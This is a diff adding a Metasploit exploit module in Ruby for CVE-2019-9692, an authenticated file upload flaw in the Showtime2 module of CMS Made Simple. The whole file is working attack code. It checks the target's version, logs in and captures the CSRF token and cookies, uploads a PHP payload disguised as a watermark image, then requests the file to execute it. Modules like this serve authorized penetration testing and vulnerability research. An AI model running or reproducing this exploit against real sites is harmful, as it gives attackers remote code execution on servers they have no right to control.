@@ -1,0 +1,164 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "CMS Made Simple (CMSMS) Showtime2 File Upload RCE",
+      'Description' => %q(
+        This module exploits a File Upload vulnerability that lead in a RCE in
+        Showtime2 module (<= 3.6.2) in CMS Made Simple (CMSMS). An authenticated
+        user with "Use Showtime2" privilege could exploit the vulnerability.
+
+        The vulnerability exists in the Showtime2 module, where the class
+        "class.showtime2_image.php" does not ensure that a watermark file
+        has a standard image file extension (GIF, JPG, JPEG, or PNG).
+
+        Tested on Showtime2 3.6.2, 3.6.1, 3.6.0, 3.5.4, 3.5.3, 3.5.2, 3.5.1, 3.5.0,
+        3.4.5, 3.4.3, 3.4.2 on CMS Made Simple (CMSMS) 2.2.9.1
+      ),
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'Daniele Scanu', # Discovery & PoC
+          'Fabio Cogno' # Metasploit module
+        ],
+      'References' =>
+        [
+          ['CVE', '2019-9692'],
+          ['CWE', '434'],
+          ['EDB', '46546'],
+          ['URL', 'https://forum.cmsmadesimple.org/viewtopic.php?f=1&t=80285'],
+          ['URL', 'http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47']
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Mar 11 2019",
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base CMS Made Simple directory path", '/']),
+        OptString.new('USERNAME', [true, "Username to authenticate with", '']),
+        OptString.new('PASSWORD', [false, "Password to authenticate with", ''])
+      ]
+    )
+  end
+
+  def do_login
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin', 'login.php'),
+      'vars_post' => {
+        'username' => datastore['username'],
+        'password' => datastore['password'],
+        'loginsubmit' => 'Submit'
+      }
+    )
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code == 302
+      @csrf_name = res.headers['Location'].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-2].to_s
+      @csrf_value = res.headers['Location'].scan(/([^?=&]+)[=([^&]*)]?/).flatten[-1].to_s
+      @cookies = res.get_cookies
+      return
+    end
+
+    fail_with(Failure::NoAccess, 'Authentication was unsuccessful')
+  end
+
+  def upload(fname, fcontent)
+    # construct POST data
+    data = Rex::MIME::Message.new
+    data.add_part('Showtime2,m1_,defaultadmin,0', nil, nil, "form-data; name=\"mact\"")
+    data.add_part('Upload', nil, nil, "form-data; name=\"m1_upload_submit\"")
+    data.add_part(@csrf_value, nil, nil, "form-data; name=\"#{@csrf_name}\"")
+    data.add_part(fcontent, 'text/plain', nil, "from-data; name=\"m1_input_browse\"; filename=\"#{fname}\"")
+
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri, 'admin', 'moduleinterface.php'),
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'data' => data.to_s,
+      'headers' => {
+        'Cookie' => @cookies
+      }
+    )
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code == 200 && (res.body =~ /#{Regexp.escape(fname)}/i || res.body =~ /id="showoverview"/i)
+      return
+    end
+
+    print_warning('No confidence in PHP payload success or failure')
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'modules', 'Showtime2', 'moduleinfo.ini')
+    )
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code == 200
+      module_version = Gem::Version.new(res.body.scan(/^version = "?(\d\.\d\.\d)"?/).flatten.first)
+      if module_version < Gem::Version.new('3.6.3')
+        # Showtime2 module is uploaded and present on "Module Manager" section but it could be NOT installed.
+        vprint_status("Showtime2 version: #{module_version}")
+        return Exploit::CheckCode::Appears
+      end
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    unless Exploit::CheckCode::Appears == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+
+    @csrf_name = nil
+    @csrf_value = nil
+    @cookies = nil
+
+    do_login
+
+    # Upload PHP payload
+    fname = "#{rand_text_alphanumeric(3..9)}.php"
+    fcontent = "<?php #{payload.encode} ?>"
+    print_status('Uploading PHP payload.')
+    upload(fname, fcontent)
+
+    # Register uploaded PHP payload file for cleanup
+    register_files_for_cleanup('./' + fname)
+
+    # Retrieve and execute PHP payload
+    print_status("Making request for '/#{fname}' to execute payload.")
+    send_request_cgi(
+      {
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path, 'uploads', 'images', fname)
+      },
+      15
+    )
+  end
+end
